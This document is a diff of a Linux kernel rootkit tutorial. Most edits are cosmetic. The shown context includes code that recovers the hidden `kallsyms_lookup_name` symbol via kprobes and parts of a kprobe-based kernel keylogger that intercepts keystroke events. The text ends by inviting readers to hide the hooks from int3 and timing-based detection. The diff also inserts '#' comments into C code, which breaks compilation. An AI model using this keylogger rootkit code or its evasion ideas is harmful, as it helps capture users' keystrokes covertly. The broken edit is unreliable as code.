@@ -85,7 +85,11 @@ OPTIMIZATION (The Fast Path):
                           [ JMP Back ]
 
 
-----[ Dev Environment ]---------------------------------------------------
+  _____ _   ___     _____ ____   ___  _   _ __  __ _____ _   _ _____ 
+ | ____| \ | \ \   / /_ _|  _ \ / _ \| \ | |  \/  | ____| \ | |_   _|
+ |  _| |  \| |\ \ / / | || |_) | | | |  \| | |\/| |  _| |  \| | | | 
+ | |___| |\  | \ V /  | ||  _ <| |_| | |\  | |  | | |___| |\  | | | 
+ |_____|_| \_|  \_/  |___|_| \_\\___/|_| \_|_|  |_|_____|_| \_| |_| 
 
 REQUIRED TOOLS:
     sudo apt install build-essential linux-headers-$(uname -r)
@@ -103,9 +107,6 @@ WORKSPACE LAYOUT:
 Before we begin, we need a utility. As discussed in the Ftrace section, modern
 kernels do not export `kallsyms_lookup_name`.
 
-We can use a Kprobe to find it. This is the standard bypass you will commonly find.
-
-
 #include <linux/kprobes.h>
 
 static unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
@@ -118,7 +119,8 @@ unsigned long get_symbol_addr(const char *symbol)
 {
     int ret;
 
-    if (!kallsyms_lookup_name_ptr) {
+    if (!kallsyms_lookup_name_ptr) 
+    {
         ret = register_kprobe(&kp_lookup);
         if (ret < 0) return 0;
         kallsyms_lookup_name_ptr = (void *)kp_lookup.addr;
@@ -127,6 +129,11 @@ unsigned long get_symbol_addr(const char *symbol)
     return kallsyms_lookup_name_ptr(symbol);
 }
 
+  ____  ___  ____  _____   _______  __    _    __  __ ____  _     _____ ____ 
+ / ___|/ _ \|  _ \| ____| | ____\ \/ /   / \  |  \/  |  _ \| |   | ____/ ___| 
+| |   | | | | | | |  _|   |  _|  \  /   / _ \ | |\/| | |_) | |   |  _| \___ \ 
+| |___| |_| | |_| | |___  | |___ /  \  / ___ \| |  | |  __/| |___| |___ ___) |
+ \____|\___/|____/|_____| |_____/_/\_\/_/   \_\_|  |_|_|   |_____|_____|____/ 
 
 ----[ Walkthrough 1: Kernel Keylogger ]---------------------
 
@@ -229,6 +236,9 @@ char *get_key_char(int code) {
 static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
     // x86_64 register map for input_handle_event:
+    //      - RSI holds the Event Type (We want EV_KEY).
+    //      - RDX holds the Key Code (Which key was pressed).
+    //      - RCX holds the Value (1 for Press, 0 for Release).
     // arg1 (type)  = rsi
     // arg2 (code)  = rdx
     // arg3 (value) = rcx
@@ -259,7 +269,10 @@ static struct kprobe kp = {
 
 static int __init rk_init(void) {
     printk(KERN_INFO "rootkit: keylogger loaded\n");
-    return register_kprobe(&kp);
+
+    # If probe registers 0, we are good to load
+    # anything else, tell kernel to abort load immediately
+    return register_kprobe(&kp); 
 }
 
 static void __exit rk_exit(void) {
@@ -415,7 +428,7 @@ module_exit(rk_exit);
     Prove other commands still work.
     $ ls
 
-----[ Walkthrough 3: Quaratnine ]-------------
+----[ Walkthrough 3: Quarantine ]-------------
 
 This module demonstrates manipulating process logic. We will target a specific 
 process ("python3") and apply two rules:
@@ -595,7 +608,7 @@ DETECTION METHODS:
         
     Performance:
         Kprobes add latency. A timing analysis of syscalls can reveal 
-        that `execve` is 100x slower than usual. 
+        that `execve` can be 100x slower than usual. 
 
 So, can you make our int3 bytes look normal, and speed up execve? :D
 
@@ -606,9 +619,10 @@ YOU ARE NOW READY:
     [✓] Can build a Process Quarantine
     [✓] Know how to hijack the Instruction Pointer
 
-Next, we move to the modern era. What if we could write these hooks without
-risking a kernel panic? What if we could write "Safe" rootkits that work
-across different kernel versions automatically?
+
+Onto something else.
+Onto...
+eBPF!!!
 
             ▐             
             ▜▀ ▞▀▖▛▀▖▞▀▌▌ ▌
@@ -620,6 +634,5 @@ across different kernel versions automatically?
                  EXPLOITATION
 
 .EOF
-
 
 ```
